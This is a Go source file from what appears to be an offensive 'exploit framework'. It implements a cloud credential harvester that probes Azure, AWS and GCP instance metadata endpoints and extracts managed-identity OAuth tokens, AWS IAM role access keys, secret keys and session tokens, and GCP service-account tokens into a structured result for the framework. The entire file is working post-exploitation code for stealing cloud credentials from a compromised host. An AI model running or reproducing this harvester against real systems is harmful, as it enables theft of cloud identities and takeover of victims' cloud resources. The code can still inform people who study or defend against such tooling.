package cloud

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
)

// imdsTokenResponse represents a parsed IMDS token response (Azure/GCP).
type imdsTokenResponse struct {
	AccessToken string `json:"access_token"`
	ExpiresIn   string `json:"expires_in"`
	ExpiresOn   string `json:"expires_on"`
	Resource    string `json:"resource"`
	TokenType   string `json:"token_type"`
}

// awsIMDSCredentials represents AWS IAM role credentials from IMDS.
type awsIMDSCredentials struct {
	Code            string `json:"Code"`
	AccessKeyId     string `json:"AccessKeyId"`
	SecretAccessKey string `json:"SecretAccessKey"`
	Token           string `json:"Token"`
	Expiration      string `json:"Expiration"`
}

const (
	azureIMDSURL = "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
	awsIMDSURL   = "http://169.254.169.254/latest/meta-data/"
	gcpIMDSURL   = "http://metadata.google.internal/computeMetadata/v1/"
	imdsTimeout  = 3 * time.Second
)

// harvestIMDS probes all cloud provider metadata endpoints to detect the
// environment and extract instance metadata. Cross-platform.
func harvestIMDS(ctx context.Context) *pb.CloudHarvestResult {
	result := &pb.CloudHarvestResult{
		Provider: "imds",
		Method:   "imds",
	}

	client := &http.Client{Timeout: imdsTimeout}
	found := false

	// Try Azure IMDS
	if metadata, err := queryIMDS(ctx, client, azureIMDSURL, map[string]string{"Metadata": "true"}); err == nil {
		result.Metadata = fmt.Sprintf(`{"azure_imds": %s}`, metadata)
		result.Provider = "azure"
		found = true

		// H7: Parse Azure IMDS token response properly instead of storing raw JSON
		tokenURL := "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
		if tokenData, err := queryIMDS(ctx, client, tokenURL, map[string]string{"Metadata": "true"}); err == nil {
			var tok imdsTokenResponse
			if err := json.Unmarshal([]byte(tokenData), &tok); err == nil && tok.AccessToken != "" {
				result.Tokens = append(result.Tokens, &pb.CloudToken{
					Provider:    "azure",
					TokenType:   "managed_identity",
					AccessToken: tok.AccessToken,
					Resource:    tok.Resource,
					Source:      "imds",
				})
			}
		}
	}

	// Try AWS IMDS (v1 - no token needed)
	if metadata, err := queryIMDS(ctx, client, awsIMDSURL, nil); err == nil && !found {
		result.Metadata = fmt.Sprintf(`{"aws_imds": "%s"}`, metadata)
		result.Provider = "aws"
		found = true

		// H8: Parse AWS IAM role credentials into structured CloudCredential
		rolePath := awsIMDSURL + "iam/security-credentials/"
		if roleName, err := queryIMDS(ctx, client, rolePath, nil); err == nil && roleName != "" {
			credURL := rolePath + roleName
			if credData, err := queryIMDS(ctx, client, credURL, nil); err == nil {
				var creds awsIMDSCredentials
				if err := json.Unmarshal([]byte(credData), &creds); err == nil && creds.AccessKeyId != "" {
					result.Credentials = append(result.Credentials, &pb.CloudCredential{
						Provider: "aws",
						CredType: "iam_role",
						Identity: creds.AccessKeyId,
						Secret:   creds.SecretAccessKey,
						Extra:    creds.Token,
						Source:   "imds:" + roleName,
					})
				}
			}
		}
	}

	// Try GCP metadata
	if metadata, err := queryIMDS(ctx, client, gcpIMDSURL+"?recursive=true", map[string]string{"Metadata-Flavor": "Google"}); err == nil && !found {
		result.Metadata = fmt.Sprintf(`{"gcp_imds": %s}`, metadata)
		result.Provider = "gcp"
		found = true

		// H7: Parse GCP IMDS token response properly
		tokenURL := gcpIMDSURL + "instance/service-accounts/default/token"
		if tokenData, err := queryIMDS(ctx, client, tokenURL, map[string]string{"Metadata-Flavor": "Google"}); err == nil {
			var tok imdsTokenResponse
			if err := json.Unmarshal([]byte(tokenData), &tok); err == nil && tok.AccessToken != "" {
				result.Tokens = append(result.Tokens, &pb.CloudToken{
					Provider:    "gcp",
					TokenType:   "service_account",
					AccessToken: tok.AccessToken,
					Source:      "imds",
				})
			}
		}
	}

	if !found {
		return nil
	}
	return result
}

func queryIMDS(ctx context.Context, client *http.Client, url string, headers map[string]string) (string, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return "", err
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}

	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("IMDS returned %d", resp.StatusCode)
	}

	body, err := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if err != nil {
		return "", err
	}
	return string(body), nil
}
